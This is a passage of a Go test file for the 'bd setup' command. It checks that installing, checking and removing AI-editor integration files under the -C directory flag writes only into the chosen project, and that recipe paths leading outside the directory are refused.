			{name: "path through a link inside", recipe: "lint", toml: "[recipes.lint]\npath = \"in/lint.md\"\n", file: "sub/lint.md",
				links: map[string]string{"in": "sub"}},
			{name: "windsurf override", recipe: "windsurf", toml: "[recipes.windsurf]\npath = \"rules/beads.md\"\n", file: "rules/beads.md"},
			{name: "built-in windsurf", recipe: "windsurf", file: ".windsurf/rules/beads.md"},
		} {
			t.Run(tt.name, func(t *testing.T) {
				ws, _ := workspace(t, tt.toml, tt.links)
				file := filepath.Join(ws, filepath.FromSlash(tt.file))
				for _, mode := range []struct {
					name   string
					flag   *bool
					exists bool
				}{{"install", nil, true}, {"--check", &setupCheck, true}, {"--remove", &setupRemove, false}} {
					resetSetupGlobals(t)
					if mode.flag != nil {
						*mode.flag = true
					}
					var err error
					_, stderr := captureStdio(t, func() { err = runRecipe(tt.recipe) })
					if err != nil || stderr != "" {
						t.Errorf("bd setup %s %s: %v, stderr %q", tt.recipe, mode.name, err, stderr)
					}
					if _, err := os.Stat(file); (err == nil) != mode.exists {
						t.Errorf("after bd setup %s %s, %s exists = %v, want %v", tt.recipe, mode.name, tt.file, err == nil, mode.exists)
					}
				}
			})
		}
	})
}

// TestAddRecipe_RefusesPathOutsideDir pins that bd setup --add does not save
// a recipe whose path bd setup would refuse (recipes.PathInside), and saves
// an ordinary one, and one with no path, as before.
func TestAddRecipe_RefusesPathOutsideDir(t *testing.T) {
	ws := t.TempDir()
	beadsDir := filepath.Join(ws, ".beads")
	if err := os.MkdirAll(beadsDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Chdir(ws)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	for _, path := range []string{filepath.Join("..", "victim.md"), filepath.Join(ws, "victim.md")} {
		err := addRecipe("myeditor", path)
		if want := "recipe path " + recipeRefusalWord(path) + " is not inside the directory bd setup runs in; " +
			"a .beads/recipes.toml recipe can only name a relative path with no '..' or symbolic link leading out of the directory bd setup runs in, and no dangling or looping link along it"; err == nil || err.Error() != want {
			t.Errorf("bd setup --add myeditor %q = %v; want %q", path, err, want)
		}
		if _, err := os.Stat(filepath.Join(beadsDir, "recipes.toml")); !os.IsNotExist(err) {
			t.Fatalf("bd setup --add myeditor %q wrote recipes.toml: %v", path, err)
		}
	}
	for _, path := range []string{".myeditor/rules.md", ""} {
		if out := captureStdout(t, func() error { return addRecipe("myeditor", path) }); !strings.HasPrefix(out, "✓ Added recipe 'myeditor'") {
			t.Errorf("bd setup --add myeditor %q printed %q", path, out)
		}
		saved, err := recipes.LoadUserRecipes(beadsDir)
		if err != nil || saved["myeditor"].Path != path {
			t.Errorf("bd setup --add myeditor %q saved %+v, %v", path, saved["myeditor"], err)
		}
	}
}

// TestSetupClaude_ChangeDirWritesToSelectedProject pins #8283: `bd -C <project>
// setup claude` must write the project's Claude integration under <project>,
// not under the process working directory, as `cd <project> && bd setup
// claude` does.
func TestSetupClaude_ChangeDirWritesToSelectedProject(t *testing.T) {
	startDir := t.TempDir()
	projectDir := t.TempDir()
	if resolved, err := filepath.EvalSymlinks(projectDir); err == nil {
		projectDir = resolved
	}
	beadsDir := filepath.Join(projectDir, ".beads")
	if err := os.MkdirAll(beadsDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"backend":"dolt"}`), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	t.Setenv("HOME", t.TempDir())
	t.Chdir(startDir)
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)
	restoreManaged := setup.SetClaudeManagedSettingsDirForTest("")
	t.Cleanup(restoreManaged)

	origChangeDir := changeDir
	changeDir = projectDir
	t.Cleanup(func() { changeDir = origChangeDir })
	t.Setenv("BEADS_DIR", beadsDir)

	_ = captureStdout(t, func() error {
		return runRecipe("claude")
	})

	if _, err := os.Stat(filepath.Join(startDir, ".claude")); !os.IsNotExist(err) {
		t.Errorf("bd -C %s setup claude wrote .claude into the process cwd %s (stat err=%v)", projectDir, startDir, err)
	}
	if _, err := os.Stat(filepath.Join(projectDir, ".claude", "settings.json")); err != nil {
		t.Errorf("bd -C %s setup claude did not write the selected project's .claude/settings.json: %v", projectDir, err)
	}
}

// changeDirTempDir is a t.TempDir with its symlinks resolved, so paths bd
// prints and the paths a test builds compare equal on macOS too.
func changeDirTempDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	if resolved, err := filepath.EvalSymlinks(dir); err == nil {
		dir = resolved
	}
	return dir
}

// changeDirSetupFixture runs bd setup as bd -C <target> setup does from
// launch: launch is the working directory, target a separate beads
// workspace, and home an empty user home. It sets the -C flag and BEADS_DIR
// as applyChangeDirSelection does, without changing the working directory,
// and clears what a host could leak in (CODEX_HOME, Claude Code's managed
// settings, discovery caches, bd setup's flags).
func changeDirSetupFixture(t *testing.T) (launch, target, home string) {
	t.Helper()
	launch, target, home = changeDirTempDir(t), changeDirTempDir(t), changeDirTempDir(t)
	beadsDir := filepath.Join(target, ".beads")
	if err := os.MkdirAll(beadsDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"backend":"dolt"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Setenv("CODEX_HOME", "")
	t.Setenv("BEADS_DB", "")
	t.Setenv("BD_DB", "")
	t.Chdir(launch)
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)
	t.Cleanup(setup.SetClaudeManagedSettingsDirForTest(""))

	origChangeDir := changeDir
	changeDir = target
	t.Cleanup(func() { changeDir = origChangeDir })
	t.Setenv("BEADS_DIR", beadsDir)
	return launch, target, home
}

// treeSnapshot maps every entry below dir, by its slash-separated path
// relative to dir, to what it is: a file's content, "<dir>" for a
// directory, or "-> target" for a symbolic link.
func treeSnapshot(t *testing.T, dir string) map[string]string {
	t.Helper()
	snap := map[string]string{}
	if err := filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil || rel == "." {
			return err
		}
		rel = filepath.ToSlash(rel)
		switch {
		case d.Type()&os.ModeSymlink != 0:
			target, err := os.Readlink(path)
			if err != nil {
				return err
			}
			snap[rel] = "-> " + target
		case d.IsDir():
			snap[rel] = "<dir>"
		default:
			data, err := os.ReadFile(path) // #nosec G304 -- test fixture
			if err != nil {
				return err
			}
			snap[rel] = string(data)
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	return snap
}

// assertSameTree fails t when dir's tree is no longer before.
func assertSameTree(t *testing.T, what, dir string, before map[string]string) {
	t.Helper()
	after := treeSnapshot(t, dir)
	for name, was := range before {
		if now, ok := after[name]; !ok {
			t.Errorf("%s: %s was removed", what, name)
		} else if now != was {
			t.Errorf("%s: %s changed", what, name)
		}
	}
	for name := range after {
		if _, ok := before[name]; !ok {
			t.Errorf("%s: %s was created", what, name)
		}
	}
}

// changeDirProjectRecipes are the project-scope recipes bd setup installs,
// with flags, and files each writes under the project it installs into.
// Claude Code reads the shared skill from its plugin, so bd setup claude
// does not install .agents/skills/beads as codex and cursor do.
var changeDirProjectRecipes = []struct {
	recipe  string
	project bool     // --project
	files   []string // slash-separated, relative to the project
	printed bool     // a generic recipe, which prints each file it wrote
}{
	{recipe: "claude", files: []string{".claude/settings.json"}},
	{recipe: "codex", files: []string{"AGENTS.md", ".agents/skills/beads/SKILL.md"}},
	{recipe: "cursor", files: []string{".cursor/rules/beads.mdc", ".cursor/hooks.json", ".agents/skills/beads/SKILL.md"}},
	{recipe: "factory", files: []string{"AGENTS.md"}},
	{recipe: "opencode", files: []string{"AGENTS.md"}},
	{recipe: "aider", files: []string{".aider.conf.yml", ".aider/BEADS.md", ".aider/README.md"}},
	{recipe: "junie", files: []string{".junie/guidelines.md", ".junie/mcp/mcp.json"}},
	{recipe: "windsurf", files: []string{".windsurf/rules/beads.md"}, printed: true},
	{recipe: "cody", files: []string{".cody/rules/beads.md"}, printed: true},
	{recipe: "kilocode", files: []string{".kilocode/rules/beads.md"}, printed: true},
	{recipe: "kiro", files: []string{".kiro/steering/beads.md"}, printed: true},
	{recipe: "copilot", files: []string{".copilot-plugin/plugin.json", ".github/copilot-instructions.md"}, printed: true},
	{recipe: "gemini", project: true, files: []string{".gemini/settings.json", "GEMINI.md"}},
	{recipe: "mux", project: true, files: []string{"AGENTS.md", ".mux/AGENTS.md"}},
}

// TestSetupChangeDir_InstallWritesTarget pins #8283 for install: bd -C T
// setup <recipe> run from L writes the recipe's project files under T, as
// cd T && bd setup <recipe> does, and leaves L as it was. It runs the
// recipes through runSetup with their real default environments, which
// resolved the project from the working directory.
func TestSetupChangeDir_InstallWritesTarget(t *testing.T) {
	for _, tc := range changeDirProjectRecipes {
		t.Run(tc.recipe, func(t *testing.T) {
			launch, target, _ := changeDirSetupFixture(t)
			setupProject = tc.project

			out := captureStdout(t, func() error { return runSetup(setupCmd, []string{tc.recipe}) })

			for _, file := range tc.files {
				path := filepath.Join(target, filepath.FromSlash(file))
				if _, err := os.Stat(path); err != nil {
					t.Errorf("bd -C T setup %s did not write T/%s: %v\n%s", tc.recipe, file, err, out)
				}
				if tc.printed && !strings.Contains(out, "  File: "+path+"\n") {
					t.Errorf("bd -C T setup %s did not report %s:\n%s", tc.recipe, path, out)
				}
			}
			assertSameTree(t, "L after bd -C T setup "+tc.recipe, launch, map[string]string{})
		})
	}

	// A workspace recipe from T's .beads/recipes.toml installs into T too.
	t.Run("workspace recipe", func(t *testing.T) {
		launch, target, _ := changeDirSetupFixture(t)
		if err := os.WriteFile(filepath.Join(target, ".beads", "recipes.toml"), []byte("[recipes.myed]\npath = \".myed/rules.md\"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		out := captureStdout(t, func() error { return runSetup(setupCmd, []string{"myed"}) })
		path := filepath.Join(target, ".myed", "rules.md")
		if data, err := os.ReadFile(path); err != nil || string(data) != recipes.Template {
			t.Errorf("bd -C T setup myed wrote T/.myed/rules.md = %q, %v\n%s", data, err, out)
		}
		if !strings.Contains(out, "  File: "+path+"\n") {
			t.Errorf("bd -C T setup myed did not report %s:\n%s", path, out)
		}
		assertSameTree(t, "L after bd -C T setup myed", launch, map[string]string{})
	})
}

// runSetupIn runs bd setup args with -C set to changeDirArg ("" for none)
// and returns what it printed. It leaves the -C flag as it found it.
func runSetupIn(t *testing.T, changeDirArg string, args ...string) string {
	t.Helper()
	orig := changeDir
	changeDir = changeDirArg
	defer func() { changeDir = orig }()
	return captureStdout(t, func() error { return runSetup(setupCmd, args) })
}

// TestSetupChangeDir_RemoveTouchesOnlyTarget pins #8283 for --remove: with
// the integration installed in both T and L, bd -C T setup <recipe> --remove
// run from L takes it out of T, leaving T as cd T && bd setup <recipe>
// --remove leaves a workspace (R here), unrelated content in T and T itself
// in place, and L byte for byte as it was.
func TestSetupChangeDir_RemoveTouchesOnlyTarget(t *testing.T) {
	for _, tc := range changeDirProjectRecipes {
		t.Run(tc.recipe, func(t *testing.T) {
			launch, target, _ := changeDirSetupFixture(t)
			setupProject = tc.project
			targetBeads := os.Getenv("BEADS_DIR")

			// R: the oracle, installed and removed with R as the working
			// directory, as cd R && bd setup does.
			ref := changeDirTempDir(t)
			if err := os.MkdirAll(filepath.Join(ref, ".beads"), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(ref, ".beads", "metadata.json"), []byte(`{"backend":"dolt"}`), 0o600); err != nil {
				t.Fatal(err)
			}
			for _, dir := range []string{ref, target, launch} {
				if err := os.WriteFile(filepath.Join(dir, "unrelated.txt"), []byte("keep\n"), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			t.Chdir(ref)
			t.Setenv("BEADS_DIR", filepath.Join(ref, ".beads"))
			resetSetupResolutionCaches(t)
			runSetupIn(t, "", tc.recipe)
			setupRemove = true
			runSetupIn(t, "", tc.recipe)
			setupRemove = false
			wantTarget := treeSnapshot(t, ref)

			// L: installed with L as the working directory.
			t.Chdir(launch)
			resetSetupResolutionCaches(t)
			runSetupIn(t, "", tc.recipe)
			launchBefore := treeSnapshot(t, launch)

			// T: installed and removed through -C from L.
			t.Setenv("BEADS_DIR", targetBeads)
			resetSetupResolutionCaches(t)
			runSetupIn(t, target, tc.recipe)
			installed := treeSnapshot(t, target)
			setupRemove = true
			out := runSetupIn(t, target, tc.recipe)

			after := treeSnapshot(t, target)
			for _, file := range tc.files {
				if now, ok := after[file]; ok && now == installed[file] {
					t.Errorf("bd -C T setup %s --remove left T/%s as installed:\n%s", tc.recipe, file, out)
				}
			}
			if after["unrelated.txt"] != "keep\n" {
				t.Errorf("bd -C T setup %s --remove touched T/unrelated.txt", tc.recipe)
			}
			assertSameTree(t, "T after bd -C T setup "+tc.recipe+" --remove (vs cd R && bd setup --remove)", target, wantTarget)
			assertSameTree(t, "L after bd -C T setup "+tc.recipe+" --remove", launch, launchBefore)
		})
	}

	// A recipe file named by a bare name sits in the -C directory itself:
	// removing it must not take that directory with it when it is left
	// empty. Here T is a subdirectory of the workspace, holding nothing else.
	t.Run("bare name keeps the -C directory", func(t *testing.T) {
		_, workspace, _ := changeDirSetupFixture(t)
		if err := os.WriteFile(filepath.Join(workspace, ".beads", "recipes.toml"), []byte("[recipes.bare]\npath = \"bare.md\"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		target := filepath.Join(workspace, "sub")
		if err := os.Mkdir(target, 0o750); err != nil {
			t.Fatal(err)
		}
		runSetupIn(t, target, "bare")
		if _, err := os.Stat(filepath.Join(target, "bare.md")); err != nil {
			t.Fatalf("bd -C T setup bare did not write T/bare.md: %v", err)
		}
		setupRemove = true
		out := runSetupIn(t, target, "bare")
		if _, err := os.Stat(filepath.Join(target, "bare.md")); !os.IsNotExist(err) {
			t.Errorf("bd -C T setup bare --remove left T/bare.md: %v\n%s", err, out)
		}
		if info, err := os.Stat(target); err != nil || !info.IsDir() {
			t.Errorf("bd -C T setup bare --remove removed T itself: %v\n%s", err, out)
		}
	})
}

// runSetupErrIn is runSetupIn returning bd setup's error as well.
func runSetupErrIn(t *testing.T, changeDirArg string, args ...string) (string, error) {
	t.Helper()
	var err error
	orig := changeDir
	changeDir = changeDirArg
	defer func() { changeDir = orig }()
	out := captureStdout(t, func() error {
		err = runSetup(setupCmd, args)
		return nil
	})
	return out, err
}

// TestSetupChangeDir_CheckReadsTarget pins #8283 for --check: with the
// integration installed only in L and nothing in an empty user home, bd -C T
// setup <recipe> --check run from L reports it missing in T, not L's as
// installed; once it is installed in T, the same check passes.
func TestSetupChangeDir_CheckReadsTarget(t *testing.T) {
	for _, tc := range changeDirProjectRecipes {
		t.Run(tc.recipe, func(t *testing.T) {
			launch, target, _ := changeDirSetupFixture(t)
			setupProject = tc.project
			runSetupIn(t, "", tc.recipe) // installed in L only
			launchBefore := treeSnapshot(t, launch)

			setupCheck = true
			if out, err := runSetupErrIn(t, target, tc.recipe); err == nil {
				t.Errorf("bd -C T setup %s --check = nil with nothing in T; it read L:\n%s", tc.recipe, out)
			} else if tc.printed && !strings.Contains(out, "  Missing: "+filepath.Join(target, filepath.FromSlash(tc.files[0]))+"\n") {
				t.Errorf("bd -C T setup %s --check did not name T's missing file:\n%s", tc.recipe, out)
			}
			assertSameTree(t, "L after bd -C T setup "+tc.recipe+" --check", launch, launchBefore)

			setupCheck = false
			runSetupIn(t, target, tc.recipe)
			setupCheck = true
			if out, err := runSetupErrIn(t, target, tc.recipe); err != nil {
				t.Errorf("bd -C T setup %s --check = %v with it installed in T:\n%s", tc.recipe, err, out)
			}
		})
	}
}

// TestSetupChangeDir_WorkspaceRecipeConfinedToTarget pins #8283 for the
// workspace recipe confinement (recipes.PathInside): under bd -C T, a
// .beads/recipes.toml recipe's paths must stay inside T, not inside L. T/out
// links outside T while L has no out, so out/x.md is outside T only:
// install, --check, --remove and --add all refuse it, naming the -C
// directory, before touching a recipe file or the configuration, and a
// multifile recipe writes none of its files. Paths inside T, through an
// inward link too, still install.
func TestSetupChangeDir_WorkspaceRecipeConfinedToTarget(t *testing.T) {
	const refusal = "is not inside the -C directory bd setup installs into"
	// fixture links T/out to outside, which holds x.md, and writes toml
	// as T's recipes.toml.
	fixture := func(t *testing.T, toml string) (launch, target, outside string) {
		t.Helper()
		launch, target, _ = changeDirSetupFixture(t)
		outside = changeDirTempDir(t)
		if err := os.WriteFile(filepath.Join(outside, "x.md"), []byte("victim\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(outside, filepath.Join(target, "out")); err != nil {
			t.Skipf("symlink: %v", err)
		}
		if err := os.WriteFile(filepath.Join(target, ".beads", "recipes.toml"), []byte(toml), 0o600); err != nil {
			t.Fatal(err)
		}
		return launch, target, outside
	}

	for _, tc := range []struct {
		name, toml string
	}{
		{"file", "[recipes.lint]\npath = \"out/x.md\"\n"},
		{"multifile", "[recipes.lint]\ntype = \"multifile\"\npaths = [\"ok.md\", \"out/x.md\"]\n"},
	} {
		for _, mode := range []struct {
			name string
			flag *bool
		}{{"install", nil}, {"--check", &setupCheck}, {"--remove", &setupRemove}} {
			t.Run(tc.name+" "+mode.name, func(t *testing.T) {
				launch, target, outside := fixture(t, tc.toml)
				if mode.flag != nil {
					*mode.flag = true
				}
				targetBefore, outsideBefore := treeSnapshot(t, target), treeSnapshot(t, outside)

				var err error
				_, stderr := captureStdio(t, func() {
					orig := changeDir
					changeDir = target
					defer func() { changeDir = orig }()
					err = runSetup(setupCmd, []string{"lint"})
				})
				what := "bd -C T setup lint " + mode.name
				if err == nil || !strings.Contains(stderr, "names 'out/x.md', which "+refusal+"\n") {
					t.Errorf("%s: err %v, stderr\n%s\nwant a refusal naming the -C directory", what, err, stderr)
				}
				assertSameTree(t, what+": T", target, targetBefore)
				assertSameTree(t, what+": outside", outside, outsideBefore)
				assertSameTree(t, what+": L", launch, map[string]string{})
			})
		}
	}

	t.Run("--add", func(t *testing.T) {
		_, target, _ := fixture(t, "")
		err := func() error {
			orig := changeDir
			changeDir = target
			defer func() { changeDir = orig }()
			return addRecipe("lint", "out/x.md")
		}()
		if err == nil || !strings.Contains(err.Error(), "'out/x.md' "+refusal+";") ||
			!strings.Contains(err.Error(), "leading out of the -C directory bd setup installs into") {
			t.Errorf("bd -C T setup --add lint out/x.md = %v; want a refusal naming the -C directory", err)
		}
		if data, _ := os.ReadFile(filepath.Join(target, ".beads", "recipes.toml")); len(data) != 0 {
			t.Errorf("bd -C T setup --add lint out/x.md wrote recipes.toml:\n%s", data)
		}
	})

	t.Run("inside paths install", func(t *testing.T) {
		launch, target, _ := fixture(t, "[recipes.deep]\npath = \"a/b/c.md\"\n\n[recipes.inward]\npath = \"in/x.md\"\n")
		if err := os.Mkdir(filepath.Join(target, "real"), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink("real", filepath.Join(target, "in")); err != nil {
			t.Fatal(err)
		}
		for recipe, file := range map[string]string{"deep": "a/b/c.md", "inward": "real/x.md"} {
			out, err := runSetupErrIn(t, target, recipe)
			if err != nil {
				t.Errorf("bd -C T setup %s = %v:\n%s", recipe, err, out)
			}
			if data, err := os.ReadFile(filepath.Join(target, filepath.FromSlash(file))); err != nil || string(data) != recipes.Template {
				t.Errorf("bd -C T setup %s wrote T/%s = %q, %v", recipe, file, data, err)
			}
		}
		assertSameTree(t, "L after bd -C T setup of inside recipes", launch, map[string]string{})
	})
}

// TestSetupChangeDir_GlobalScope pins what bd -C leaves alone: a global
// install keeps its user-level destination under the home directory and
// writes nothing into T or L, while Mux, which installs the project's
// AGENTS.md and hooks with its global layer, puts its global layer in the
// home directory and its project files, the workspace layer included, in T.
func TestSetupChangeDir_GlobalScope(t *testing.T) {
	for _, tc := range []struct {
		recipe          string
		project, global bool
		home, target    []string // files written, slash-separated
	}{
		{recipe: "claude", global: true, home: []string{".claude/settings.json"}},
		{recipe: "codex", global: true, home: []string{".codex/AGENTS.md", ".agents/skills/beads/SKILL.md"}},
		{recipe: "cursor", global: true, home: []string{".cursor/hooks.json", ".agents/skills/beads/SKILL.md"}},
		{recipe: "gemini", home: []string{".gemini/settings.json"}},
		// bd setup mux installs the project's AGENTS.md and Mux hooks with
		// either layer: those are project files, so they go into T.
		{recipe: "mux", global: true, home: []string{".mux/AGENTS.md"}, target: []string{"AGENTS.md", ".mux/init"}},
		{recipe: "mux", project: true, global: true, home: []string{".mux/AGENTS.md"}, target: []string{"AGENTS.md", ".mux/init", ".mux/AGENTS.md"}},
	} {
		name := tc.recipe
		if tc.project {
			name += " --project"
		}
		if tc.global {
			name += " --global"
		}
		t.Run(name, func(t *testing.T) {
			launch, target, home := changeDirSetupFixture(t)
			setupProject, setupGlobal = tc.project, tc.global
			targetBefore := treeSnapshot(t, target)

			out := runSetupIn(t, target, tc.recipe)

			for _, file := range tc.home {
				if _, err := os.Stat(filepath.Join(home, filepath.FromSlash(file))); err != nil {
					t.Errorf("bd -C T setup %s did not write ~/%s: %v\n%s", name, file, err, out)
				}
			}
			for _, file := range tc.target {
				if _, err := os.Stat(filepath.Join(target, filepath.FromSlash(file))); err != nil {
					t.Errorf("bd -C T setup %s did not write T/%s: %v\n%s", name, file, err, out)
				}
			}
			if len(tc.target) == 0 {
				assertSameTree(t, "T after bd -C T setup "+name, target, targetBefore)
			}
			assertSameTree(t, "L after bd -C T setup "+name, launch, map[string]string{})
		})
	}
}

// TestSetupChangeDir_RestoresBinding pins that bd -C binds the setup
// directory for one run only: after a -C run, whether it succeeded or
// failed, setup without -C (or with a blank -C) installs into the working
// directory, prints the paths it printed before, relative to it, and never
// moved the working directory. A relative -C names a directory against the
// working directory, and a -C subdirectory of a workspace is where the
// files go, not the workspace root that holds .beads.
func TestSetupChangeDir_RestoresBinding(t *testing.T) {
	for _, tc := range []struct {
		name   string
		recipe string // the -C run's recipe; an unknown one fails
	}{{"after success", "windsurf"}, {"after failure", "no-such-recipe"}} {
		t.Run(tc.name, func(t *testing.T) {
			launch, target, _ := changeDirSetupFixture(t)
			_, _ = runSetupErrIn(t, target, tc.recipe)
			if wd, err := os.Getwd(); err != nil || wd != launch {
				t.Fatalf("bd -C T setup %s moved the working directory to %q, %v", tc.recipe, wd, err)
			}
			for _, blank := range []string{"", "  "} {
				out, err := runSetupErrIn(t, blank, "kiro")
				if err != nil {
					t.Fatalf("bd setup kiro (-C %q) = %v:\n%s", blank, err, out)
				}
				if !strings.Contains(out, "  File: .kiro/steering/beads.md\n") {
					t.Errorf("bd setup kiro (-C %q) no longer prints its relative path:\n%s", blank, out)
				}
				if _, err := os.Stat(filepath.Join(launch, ".kiro", "steering", "beads.md")); err != nil {
					t.Errorf("bd setup kiro (-C %q) after a -C run did not install into L: %v", blank, err)
				}
				if _, err := os.Stat(filepath.Join(target, ".kiro")); !os.IsNotExist(err) {
					t.Errorf("bd setup kiro (-C %q) after a -C run installed into T: %v", blank, err)
				}
			}
		})
	}

	t.Run("relative -C subdirectory", func(t *testing.T) {
		_, workspace, _ := changeDirSetupFixture(t)
		// Run from the workspace's parent, naming its sub directory
		// relative to it.
		sub := filepath.Join(workspace, "sub")
		if err := os.Mkdir(sub, 0o750); err != nil {
			t.Fatal(err)
		}
		t.Chdir(filepath.Dir(workspace))
		rel := filepath.Join(filepath.Base(workspace), "sub")
		parentBefore := treeSnapshot(t, workspace)

		out, err := runSetupErrIn(t, rel, "cody")
		if err != nil {
			t.Fatalf("bd -C %s setup cody = %v:\n%s", rel, err, out)
		}
		if _, err := os.Stat(filepath.Join(sub, ".cody", "rules", "beads.md")); err != nil {
			t.Errorf("bd -C %s setup cody did not install into it: %v\n%s", rel, err, out)
		}
		delete(parentBefore, "sub")
		after := treeSnapshot(t, workspace)
		for name := range after {
			if name != "sub" && !strings.HasPrefix(name, "sub/") {
				if _, ok := parentBefore[name]; !ok {
					t.Errorf("bd -C %s setup cody wrote %s in the workspace root", rel, name)
				}
			}
		}
	})
}

// TestSetupChangeDir_OutputStaysLaunchRelative pins the #8283 boundary: -C
// moves only the integration files bd setup manages; a relative path the user
// passes, such as -o rules.md, still resolves against the directory bd runs
// in, and the global flag help says so instead of promising a git-style
// chdir.
func TestSetupChangeDir_OutputStaysLaunchRelative(t *testing.T) {
	launch, target, _ := changeDirSetupFixture(t)
	setupOutput = "rules.md"
	t.Cleanup(func() { setupOutput = "" })
	targetBefore := treeSnapshot(t, target)

	runSetupIn(t, target, "claude")

	if _, err := os.Stat(filepath.Join(launch, "rules.md")); err != nil {
		t.Fatalf("bd -C T setup -o rules.md did not write the launch directory's rules.md: %v", err)
	}
	assertSameTree(t, "target", target, targetBefore)

	usage := rootCmd.PersistentFlags().Lookup("directory").Usage
	for _, stale := range []string{"Change to this directory", "like git -C"} {
		if strings.Contains(usage, stale) {
			t.Fatalf("-C help %q still promises a process chdir (%q)", usage, stale)
		}
	}
	for _, want := range []string{"beads project", "relative path arguments", "current directory", "init"} {
		if !strings.Contains(usage, want) {
			t.Fatalf("-C help %q does not mention %q", usage, want)
		}
	}
}

// TestSetupThroughRootCmd_ChangeDirWritesTarget runs the #8283 report through
// rootCmd, so -C is parsed and the project selected the way the binary does
// it: bd -C T setup claude/codex, --check and --remove from L act on T's
// project files and leave L as it was.
func TestSetupThroughRootCmd_ChangeDirWritesTarget(t *testing.T) {
	home, launch, target := changeDirTempDir(t), changeDirTempDir(t), changeDirTempDir(t)
	if err := os.MkdirAll(filepath.Join(target, ".beads"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(target, ".beads", "metadata.json"), []byte(`{"backend":"dolt"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(setup.SetClaudeManagedSettingsDirForTest(""))
	env := map[string]string{"CODEX_HOME": "", "BD_DISABLE_METRICS": "1"}
	launchBefore := treeSnapshot(t, launch)

	run := func(wantExit int, args ...string) {
		t.Helper()
		full := append([]string{"-C", target, "setup"}, args...)
		exit, stdout, stderr := runInUserGlobalHome(t, home, launch, env, full...)
		if exit != wantExit {
			t.Fatalf("bd %s exit = %d, want %d\nstdout:\n%s\nstderr:\n%s", strings.Join(full, " "), exit, wantExit, stdout, stderr)
		}
		assertSameTree(t, "launch", launch, launchBefore)
	}
	exists := func(rel string) bool {
		_, err := os.Stat(filepath.Join(target, filepath.FromSlash(rel)))
		return err == nil
	}

	run(0, "claude")
	run(0, "codex")
	for _, rel := range []string{".claude/settings.json", "AGENTS.md", ".agents/skills/beads/SKILL.md"} {
		if !exists(rel) {
			t.Fatalf("bd -C T setup did not write T/%s", rel)
		}
	}
	run(0, "claude", "--check")
	run(0, "codex", "--check")

	run(0, "claude", "--remove")
	run(0, "codex", "--remove")
	run(1, "claude", "--check")
	if exists(".agents/skills/beads/SKILL.md") {
		t.Fatal("bd -C T setup codex --remove left T/.agents/skills/beads/SKILL.md")
	}
}
